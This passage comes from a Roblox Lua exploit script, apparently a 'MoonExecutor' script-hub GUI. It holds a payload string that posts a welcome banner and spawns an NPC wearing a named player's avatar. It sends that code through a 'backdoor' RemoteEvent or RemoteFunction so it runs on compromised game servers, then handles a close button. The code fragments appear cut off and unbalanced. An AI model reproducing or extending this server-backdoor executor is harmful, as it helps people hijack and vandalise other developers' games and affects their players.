	hint.Text = "WELCOME TO BASIC BASEPLATE"	
	hint.Parent = workspace	
	
	-- 7. Spawn NPC YTZ_DEXZ dengan avatar KHAFIDZKTP	
	local Players = game:GetService("Players")	
	local spawnLocation = workspace:FindFirstChildOfClass("SpawnLocation")	
	local spawnPos = spawnLocation and spawnLocation.Position or Vector3.new(0, 0, 0)	
	
	local ok, err = pcall(function()	
		local userId = Players:GetUserIdFromNameAsync("KHAFIDZKTP")	
		local description = Players:GetHumanoidDescriptionFromUserId(userId)	
		local character = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R6)	
		character.Name = "YTZ_DEXZ"	
		character:SetPrimaryPartCFrame(CFrame.new(spawnPos + Vector3.new(0, 5, 0)))	
		character.Parent = workspace	
	end)	
	]]	
	if not ok then	
		warn("[MoonExecutor] NPC Error: " .. tostring(err))	
	end	
	
	
		if backdoor:IsA("RemoteEvent") then	
			backdoor:FireServer(code)	
		elseif backdoor:IsA("RemoteFunction") then	
			task.spawn(function()	
				backdoor:InvokeServer(code)	
			end)	
		end	
	end)	
end;
task.spawn(C_23);
-- Players.KHAFIDZKTP.PlayerGui.ScreenGui.ScripthubFrame.ScriptMainFrame.CloseButton.CloseScript
local function C_26()
	local script = LMG2L["CloseScript_26"];
	local closeButton = script.Parent	
	local screenGui = closeButton:FindFirstAncestorOfClass("ScreenGui")	
	local Scripthubframe = screenGui:FindFirstChild("ScripthubFrame")	
	local MainFrame = screenGui:FindFirstChild("MainFrame")	
	
	closeButton.MouseButton1Click:Connect(function()	
		Scripthubframe.Visible = false	
		MainFrame.Visible = true	
	end)	
end;
task.spawn(C_26);

return LMG2L["ScreenGui_1"], require;
